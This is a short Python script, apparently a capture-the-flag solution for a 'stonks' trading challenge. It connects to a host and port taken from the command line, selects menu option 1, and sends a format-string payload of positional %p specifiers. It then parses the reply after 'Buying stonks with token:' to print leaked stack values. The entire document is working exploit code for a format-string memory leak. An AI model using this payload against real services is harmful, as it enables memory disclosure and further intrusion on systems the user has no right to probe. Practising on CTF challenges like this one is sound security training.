import socket, re, sys, time

HOST, PORT = sys.argv[1], int(sys.argv[2])
LO, HI = int(sys.argv[3]), int(sys.argv[4])

fmt = "|".join("%%%d$p" % i for i in range(LO, HI + 1)).encode()
s = socket.create_connection((HOST, PORT), timeout=15)
s.settimeout(4)
time.sleep(0.3)
s.recv(4096)
s.sendall(b"1\n")
time.sleep(0.4)
try:
    s.recv(4096)
except Exception:
    pass
s.sendall(fmt + b"\n")
time.sleep(0.6)
out = b""
try:
    while True:
        d = s.recv(8192)
        if not d:
            break
        out += d
except Exception:
    pass
s.close()
txt = out.decode(errors="replace")
seg = txt.split("Buying stonks with token:")[-1]
line = seg.split("\n")[1] if "\n" in seg else seg
toks = line.split("|")
for i, t in enumerate(toks, LO):
    print("arg %2d : %s" % (i, t.strip()[:40]))
print("---- brut ----")
print(seg[:200].replace("\n", "\\n"))
